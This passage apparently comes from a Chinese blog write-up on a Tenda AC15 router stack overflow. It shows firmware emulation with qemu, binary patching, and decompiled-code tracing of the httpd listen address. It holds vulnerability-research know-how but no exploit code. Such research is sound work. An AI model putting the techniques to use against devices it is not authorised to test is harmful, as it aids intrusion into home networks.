class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo chroot . ./qemu-arm-static --strace ./bin/httpd<br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240801225539167.png" alt="image-20240801225539167"></p><p>打印Welcome to…后报错</p><p>ida中搜索 Welcome to</p><p>下断点动态调试后发现</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802160820042.png" alt="image-20240802160820042"></p><p>这里进入了死循环，所以我们要进行patch</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240801231242696.png" alt="image-20240801231242696"></p><p>在后续的判断中，R0的值为1，和0作比较，如果正常流程，肯定会走向红线，显示connect cfm failed!，所以这里也要patch。</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240801232824120.png" alt="image-20240801232824120"></p><h5 id="255-255-255-255问题"><a href="#255-255-255-255问题" class="headerlink" title="255.255.255.255问题"></a>255.255.255.255问题</h5><p>patch后运行继续报错，ip显示255.255.255.255</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802002329484.png" alt="image-20240802002329484"></p><p>IDA搜索字符串listen ip</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802002828349.png" alt="image-20240802002828349"></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802002940852.png" alt="image-20240802002940852"></p><p>inet_ntoa函数的作用</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">inet_ntoa 是一个用于将 IPv4 地址从网络字节顺序转换为点分十进制字符串表示形式的函数。具体来说，它的作用是将 <span class="hljs-keyword">struct</span> <span class="hljs-type">in_addr</span> 类型的 IPv4 地址转换成一个以点分十进制表示的字符串。<br></code></pre></td></tr></table></figure><p>这里可以看出listen ip取决于a1</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">a1</span>--&gt;</span>&amp;<span class="hljs-function"><span class="hljs-title">s</span>.sa_data[2]--&gt;</span><span class="hljs-function"><span class="hljs-title">v8</span>--&gt;</span>listen ip<br></code></pre></td></tr></table></figure><p>打开ghidra查看此处伪代码，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">FUN_0001b84c</span><span class="hljs-params">(<span class="hljs-type">char</span> *param_1,<span class="hljs-type">int</span> param_2,undefined4 param_3,uint param_4)</span><br><br>........<br>      local_30._2_2_ = htons((<span class="hljs-type">uint16_t</span>)param_2);  <span class="hljs-comment">// 将param_2转换为网络字节序，并填充到local_30的第3、4字节</span><br>      <span class="hljs-keyword">if</span> (param_1 == (<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>) &#123;<br>        local_30._4_4_ = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 如果param_1为空指针，将local_30的第5至8字节置为0</span><br>      &#125;<br>      <span class="hljs-keyword">else</span> &#123;<br>        local_30._4_4_ = inet_addr(param_1);  <span class="hljs-comment">// 如果param_1不为空，将param_1解析为网络地址并填充到local_30的第5至8字节</span><br>      &#125;<br>........   <br>      <span class="hljs-keyword">if</span> (iVar3 &lt; <span class="hljs-number">0</span>) &#123;<br>          FUN_0001b2f0(local_14);  <span class="hljs-comment">// 调用一个处理函数</span><br>          local_14 = <span class="hljs-number">-1</span>;  <span class="hljs-comment">// 将local_14设为-1</span><br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>          pcVar2 = inet_ntoa((in_addr)local_30._4_4_);  <span class="hljs-comment">// 将local_30的第5至8字节转换为点分十进制的IP地址，并返回字符串指针</span><br>          uVar1 = ntohs(local_30._2_2_);  <span class="hljs-comment">// 将local_30的第3、4字节从网络字节序转换为主机字节序</span><br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;httpd listen ip = %s port = %d\n&quot;</span>, pcVar2, (uint)uVar1);  <span class="hljs-comment">// 打印IP地址和端口号</span><br>          <span class="hljs-keyword">if</span> (local_20 == <span class="hljs-number">0</span>) &#123;  <span class="hljs-comment">// 如果local_20为0</span><br>            iVar3 = listen(*(<span class="hljs-type">int</span> *)(local_18 + <span class="hljs-number">0xb0</span>), <span class="hljs-number">0x80</span>);  <span class="hljs-comment">// 监听套接字，设置最大连接数为0x80</span><br>            <span class="hljs-keyword">if</span> (iVar3 &lt; <span class="hljs-number">0</span>) &#123;<br>              FUN_0001b2f0(local_14);  <span class="hljs-comment">// 调用一个处理函数</span><br>              <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  <span class="hljs-comment">// 返回-1</span><br>            &#125;<br>........<br></code></pre></td></tr></table></figure><p>由此可知255.255.255.255的输出取决于函数的传参param_1</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802011535873.png" alt="image-20240802011535873"></p><p>向上查看本函数的引用共有三处、两个函数</p><p>FUN_0001ea08</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined4 <span class="hljs-title function_">FUN_0001ea08</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <span class="hljs-type">int</span> iVar2;<br>  undefined4 uVar3;<br>  <br>  iVar1 = sslport;  <span class="hljs-comment">// 从全局变量 sslport 中获取端口号</span><br>  iVar2 = FUN_000c9054();  <span class="hljs-comment">// 调用一个函数 FUN_000c9054()，可能是初始化或其他设置，返回值存储在 iVar2 中</span><br>  <span class="hljs-keyword">if</span> (iVar2 &lt; <span class="hljs-number">0</span>) &#123;<br>    fwrite(<span class="hljs-string">&quot;matrixSslOpen failed, exiting...&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0x20</span>, <span class="hljs-built_in">stderr</span>);  <span class="hljs-comment">// 如果初始化失败，向 stderr 输出错误信息</span><br>  &#125;<br>  <br>  <span class="hljs-comment">// 读取 SSL 证书和私钥</span><br>  iVar2 = thunk_FUN_000d5404(&amp;DAT_00101a24, s_/webroot/pem/certSrv.crt_000ffe60,<br>                             s_/webroot/pem/privkeySrv.pem_000ffe44, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (iVar2 &lt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-comment">// 如果读取证书失败，向 stderr 输出错误信息，并进行一些清理工作</span><br>    fwrite(<span class="hljs-string">&quot;failed to read certificates in websSSLOpen\n&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-built_in">stderr</span>);<br>    thunk_FUN_000d4ea0(DAT_00101a24);<br>    FUN_000c9098();<br>    uVar3 = <span class="hljs-number">0xffffffff</span>;  <span class="hljs-comment">// 返回错误码 0xffffffff</span><br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 成功读取证书后，根据 sslport 的值调用 FUN_0001b84c() 来开启 SSL 套接字</span><br>    <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">0</span>) &#123;<br>      DAT_000ffe40 = FUN_0001b84c(<span class="hljs-number">0</span>, <span class="hljs-number">0x1bb</span>, websSSLAccept, <span class="hljs-number">0x80</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>      DAT_000ffe40 = FUN_0001b84c(<span class="hljs-number">0</span>, iVar1, websSSLAccept, <span class="hljs-number">0x80</span>);<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span> (DAT_000ffe40 &lt; <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-comment">// 如果开启 SSL 套接字失败，向 stderr 输出错误信息</span><br>      <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;SSL: Unable to open SSL socket on port &lt;%d&gt;!\n&quot;</span>, iVar1);<br>      uVar3 = <span class="hljs-number">0xffffffff</span>;  <span class="hljs-comment">// 返回错误码 0xffffffff</span><br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>      uVar3 = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 成功开启 SSL 套接字，返回 0 表示成功</span><br>    &#125;<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> uVar3;  <span class="hljs-comment">// 返回函数结果</span><br>&#125;<br>这个函数的主要作用是初始化 SSL/TLS 相关的环境，并尝试在指定的端口上启动一个 SSL 套接字。具体的函数调用和逻辑流程如下：<br><br>获取全局变量 sslport 中的端口号。<br>调用 FUN_000c9054() 进行初始化或其他设置，检查返回值，如果小于 <span class="hljs-number">0</span>，则输出错误信息。<br>调用 thunk_FUN_000d5404() 来读取 SSL 证书和私钥。如果读取失败，输出错误信息并进行清理工作。<br>根据 sslport 的值调用 FUN_0001b84c() 来开启 SSL 套接字。<br>如果开启 SSL 套接字失败，输出相应的错误信息。<br>返回适当的错误码或成功状态码。<br>这段代码的核心功能是在指定端口上启动一个 SSL 套接字，并处理可能出现的错误情况。<br></code></pre></td></tr></table></figure><p>FUN_00029818</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">FUN_00029818</span><span class="hljs-params">(<span class="hljs-type">int</span> param_1, <span class="hljs-type">int</span> param_2)</span><br>&#123;<br>  undefined4 local_2c;<br>  undefined4 local_28;<br>  undefined4 local_24;<br>  undefined4 local_20;<br>  <span class="hljs-type">int</span> local_1c;<br>  undefined1 *local_18;<br>  <span class="hljs-type">int</span> local_14;<br>  <br>  local_18 = (undefined1 *)<span class="hljs-number">0x0</span>;  <span class="hljs-comment">// 初始化 local_18 为 NULL</span><br>  local_2c = <span class="hljs-number">0</span>;<br>  local_28 = <span class="hljs-number">0</span>;<br>  local_24 = <span class="hljs-number">0</span>;<br>  local_20 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">memset</span>(&amp;local_2c, <span class="hljs-number">0</span>, <span class="hljs-number">0x10</span>);  <span class="hljs-comment">// 清空局部变量 local_2c ~ local_20，总共16个字节</span><br>  <br>  local_18 = g_lan_ip;  <span class="hljs-comment">// 将全局变量 g_lan_ip 赋值给 local_18</span><br>  local_14 = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 初始化 local_14 为 0</span><br>  local_1c = param_1;  <span class="hljs-comment">// 将 param_1 赋值给 local_1c</span><br>  <br>  <span class="hljs-comment">// 使用循环尝试在不同端口上监听，直到成功或达到指定的尝试次数 param_2</span><br>  <span class="hljs-keyword">while</span> (local_14 &lt;= param_2 &amp;&amp; (DAT_00101a7c = FUN_0001b84c(local_18, param_1, websAccept, <span class="hljs-number">0</span>), DAT_00101a7c &lt; <span class="hljs-number">0</span>)) &#123;<br>    local_14 = local_14 + <span class="hljs-number">1</span>;  <span class="hljs-comment">// 更新尝试次数</span><br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span> (param_2 &lt; local_14) &#123;  <span class="hljs-comment">// 如果尝试次数超过了 param_2，则监听失败</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %d: Couldn\&#x27;t open a socket on ports %d\n&quot;</span>, <span class="hljs-string">&quot;websOpenListen&quot;</span>, <span class="hljs-number">0xfd</span>, local_1c);<br>    param_1 = <span class="hljs-number">-1</span>;  <span class="hljs-comment">// 返回错误码 -1</span><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 监听成功</span><br>    websPort = param_1;  <span class="hljs-comment">// 设置全局变量 websPort 为监听的端口号</span><br>    FUN_00010988(websHostUrl);  <span class="hljs-comment">// 调用一个函数，清理 websHostUrl</span><br>    FUN_00010988(websIpaddrUrl);  <span class="hljs-comment">// 调用一个函数，清理 websIpaddrUrl</span><br>    websHostUrl = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 置空 websHostUrl</span><br>    websIpaddrUrl = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 置空 websIpaddrUrl</span><br>    <br>    <span class="hljs-keyword">if</span> (param_1 == <span class="hljs-number">0x50</span>) &#123;  <span class="hljs-comment">// 如果监听端口为 80（0x50）</span><br>      websHostUrl = FUN_000109b4(websHost);  <span class="hljs-comment">// 根据 websHost 设置 websHostUrl</span><br>      websIpaddrUrl = FUN_000109b4(websIpaddr);  <span class="hljs-comment">// 根据 websIpaddr 设置 websIpaddrUrl</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// 否则，根据 websHost 和 param_1 格式化 websHostUrl，根据 websIpaddr 和 param_1 格式化 websIpaddrUrl</span><br>      FUN_0001837c(&amp;websHostUrl, <span class="hljs-number">0x1050</span>, <span class="hljs-string">&quot;%s:%d&quot;</span>, websHost, param_1);<br>      FUN_0001837c(&amp;websIpaddrUrl, <span class="hljs-number">0x1050</span>, <span class="hljs-string">&quot;%s:%d&quot;</span>, websIpaddr, param_1);<br>    &#125;<br>    <br>    <span class="hljs-comment">// 输出监听信息</span><br>    FUN_000204f8(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;webs: Listening for HTTP requests at address %s\n&quot;</span>, websIpaddrUrl);<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> param_1;  <span class="hljs-comment">// 返回监听的端口号或错误码 -1</span><br>&#125;<br>这段代码的主要功能是尝试在指定的端口上启动 HTTP 服务监听。它会尝试多次调用 FUN_0001b84c() 来监听端口，直到成功或者尝试次数达到 param_2。如果监听失败，会输出错误信息并返回 <span class="hljs-number">-1</span>；如果监听成功，会设置全局变量 websPort，清理相关变量，并输出监听地址的信息。<br></code></pre></td></tr></table></figure><p>通过对比，定位到FUN_00029818函数，查看FUN_0001b84函数的调用位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">local_18 = g_lan_ip;  <span class="hljs-comment">// 将全局变量 g_lan_ip 赋值给 local_18</span><br>local_14 = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 初始化 local_14 为 0</span><br>local_1c = param_1;  <span class="hljs-comment">// 将 param_1 赋值给 local_1c</span><br><br><span class="hljs-comment">// 使用循环尝试在不同端口上监听，直到成功或达到指定的尝试次数 param_2</span><br><span class="hljs-keyword">while</span> (local_14 &lt;= param_2 &amp;&amp; (DAT_00101a7c = FUN_0001b84c(local_18, param_1, websAccept, <span class="hljs-number">0</span>), DAT_00101a7c &lt; <span class="hljs-number">0</span>)) &#123;<br>  local_14 = local_14 + <span class="hljs-number">1</span>;  <span class="hljs-comment">// 更新尝试次数</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里可以看出param1的参数来自于全局变量 g_lan_ip</p><p>向上查看全局变量g_lan_ip的引用</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802012311473.png" alt="image-20240802012311473"></p><p>定位到两个函数FUN_0002e9ec和FUN_0002e420</p><p>FUN_0002e9ec</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">...............<br>  <span class="hljs-comment">// 执行系统命令，设置 TCP 时间戳</span><br>  doSystemCmd(<span class="hljs-string">&quot;echo 0 &gt; /proc/sys/net/ipv4/tcp_timestamps&quot;</span>);<br>  <br>  <span class="hljs-comment">// 调用一个名为 FUN_0001b6d4 的函数</span><br>  FUN_0001b6d4();<br>  <br>  <span class="hljs-comment">// 将字符串形式的 IPv4 地址转换为 in_addr 结构体</span><br>  inet_aton(g_lan_ip, &amp;local_18);<br>  <br>  <span class="hljs-comment">// 将 DAT_00100048 字符串复制到 acStack_118 数组中</span><br>  <span class="hljs-built_in">strcpy</span>(acStack_118, DAT_00100048);<br>  <br>  <span class="hljs-comment">// 调用一个名为 FUN_00012530 的函数，处理 acStack_118 数组</span><br>  FUN_00012530(acStack_118);<br>  <br>  <span class="hljs-comment">// 将本地 IP 地址转换为字符串形式，保存在 local_14 中</span><br>  local_14 = inet_ntoa(local_18);<br>  <br>  <span class="hljs-comment">// 计算 local_14 字符串的长度</span><br>  sVar1 = <span class="hljs-built_in">strlen</span>(local_14);<br>...............<br>inet_aton作用：<br><br></code></pre></td></tr></table></figure><p>FUN_0002e420</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c">...............<br>    <br>    <span class="hljs-comment">//这段代码的主要功能是获取本地的IP地址并存储在全局变量 g_lan_ip 中</span><br>    <span class="hljs-comment">// 获取本地IP地址，关键！</span><br>    uVar4 = getLanIfName();<br>    <span class="hljs-comment">// 调用 getLanIfName() 函数，获取本地网络接口名称，结果存储在 uVar4 中</span><br><br>    iVar1 = getIfIp(uVar4, &amp;local_c8);<br>    <span class="hljs-comment">// 调用 getIfIp() 函数，传入本地网络接口名称 uVar4 和指向 local_c8 的指针，获取本地IP地址信息，并将结果存储在 local_c8 中</span><br><br>    <span class="hljs-keyword">if</span> (iVar1 &lt; <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-comment">// 如果获取IP地址失败</span><br>      GetValue(<span class="hljs-string">&quot;lan.ip&quot;</span>, acStack_98);<br>      <span class="hljs-comment">// 调用 GetValue() 函数，读取配置项 &quot;lan.ip&quot; 的值，并将结果存储在 acStack_98 中</span><br><br>      <span class="hljs-built_in">strcpy</span>(g_lan_ip, acStack_98);<br>      <span class="hljs-comment">// 将 acStack_98 中的字符串复制到全局变量 g_lan_ip 中</span><br><br>      <span class="hljs-built_in">memset</span>(local_128, <span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>);<br>      <span class="hljs-comment">// 清空 local_128 数组的前 0x50（80）个字节</span><br><br>      iVar1 = tpi_lan_dhcpc_get_ipinfo_and_status(local_128);<br>      <span class="hljs-comment">// 调用 tpi_lan_dhcpc_get_ipinfo_and_status() 函数，传入 local_128，并获取IP信息和状态，结果存储在 local_128 中</span><br><br>      <span class="hljs-keyword">if</span> ((iVar1 == <span class="hljs-number">0</span>) &amp;&amp; (local_128[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;\0&#x27;</span>)) &#123;<br>        <span class="hljs-comment">// 如果获取IP信息和状态成功，并且 local_128 不为空</span><br>        vos_strcpy(g_lan_ip, local_128);<br>        <span class="hljs-comment">// 使用 vos_strcpy() 函数将 local_128 中的字符串复制到全局变量 g_lan_ip 中</span><br>      &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// 如果获取IP地址成功</span><br>      vos_strcpy(g_lan_ip, &amp;local_c8);<br>      <span class="hljs-comment">// 使用 vos_strcpy() 函数将 local_c8 中的字符串复制到全局变量 g_lan_ip 中</span><br>    &#125;<br>    &#125;<br>    <span class="hljs-built_in">memset</span>(&amp;local_d4,<span class="hljs-number">0</span>,<span class="hljs-number">9</span>);<br>    iVar2 = inet_addr(g_lan_ip);<br>    local_d4 = local_d4 &amp; <span class="hljs-number">0xff</span> | iVar2 &lt;&lt; <span class="hljs-number">8</span>;<br>    local_d0 = (undefined)(iVar2 &gt;&gt; <span class="hljs-number">0x18</span>);<br>    tpi_talk_to_kernel(<span class="hljs-number">5</span>,&amp;local_d4,&amp;local_d8,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>    FUN_0002ed58(<span class="hljs-number">1</span>);<br>    FUN_0002ed58(<span class="hljs-number">0</span>);<br>    _Var3 = getpid();<br>    doSystemCmd(<span class="hljs-string">&quot;echo %d &gt; %s&quot;</span>,_Var3,<span class="hljs-string">&quot;/etc/httpd.pid&quot;</span>);<br>    iVar1 = FUN_0002e9ec();<span class="hljs-comment">//调用FUN_0002e9ec()</span><br>    <br>.....................<br></code></pre></td></tr></table></figure><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">FUN_0002e420调用<span class="hljs-built_in">getLanIfName</span>()、<span class="hljs-built_in">getIfIp</span>()获取接口名称和ip给到了全局变量g_lan_ip<br></code></pre></td></tr></table></figure><p>向上查看发现了FUN_0002e420函数调用了FUN_0002e9ec()函数，调用链完整。</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802021508377.png" alt="image-20240802021508377"></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802021733979.png" alt="image-20240802021733979"></p><p><strong>想知道全局变量ip是怎么来的就要分析这两个外部函数的调用</strong></p><p>在lib&#x2F;中查找这两个EXETERNAL函数</p><p>getIfip这里应该是网络编程中getIfIp函数获取到ip地址</p><p>在库中查找该函数</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802020332086.png" alt="image-20240802020332086"></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">readelf <span class="hljs-punctuation">-</span>d xxx <span class="hljs-string">| grep NEEDED </span><br>这条命令的作用是用来查看 ELF 格式的可执行文件或共享库（例如动态链接库）的动态依赖项。<br></code></pre></td></tr></table></figure><p>打开libcommon.so,查找函数getIfIp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">getIfIp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1, <span class="hljs-type">char</span> *a2)</span><br>&#123;<br>  <span class="hljs-type">char</span> *v3; <span class="hljs-comment">// 存放转换后的IP地址字符串指针</span><br>  <span class="hljs-type">char</span> dest[<span class="hljs-number">20</span>]; <span class="hljs-comment">// 存放接口名称的缓冲区</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_addr</span> <span class="hljs-title">v8</span>;</span> <span class="hljs-comment">// 存放IP地址结构体</span><br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// socket文件描述符</span><br><br>  <span class="hljs-comment">// 创建一个AF_INET（IPv4）、SOCK_DGRAM（数据报套接字）、协议为0（自动选择）的套接字</span><br>  fd = socket(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( fd &lt; <span class="hljs-number">0</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; <span class="hljs-comment">// 如果创建失败，返回-1</span><br><br>  <span class="hljs-comment">// 将参数a1（接口名称）拷贝到本地缓冲区dest，最多拷贝0x10（16）字节</span><br>  <span class="hljs-built_in">strncpy</span>(dest, a1, <span class="hljs-number">0x10</span>u);<br><br>  <span class="hljs-comment">// 使用ioctl系统调用来获取指定接口的IP地址</span><br>  <span class="hljs-keyword">if</span> ( ioctl(fd, <span class="hljs-number">0x8915</span>u, dest) &gt;= <span class="hljs-number">0</span> )<br>  &#123;<br>    <span class="hljs-comment">// ioctl调用成功，将结果存储在v8结构体中的in_addr类型的变量中</span><br>    v3 = 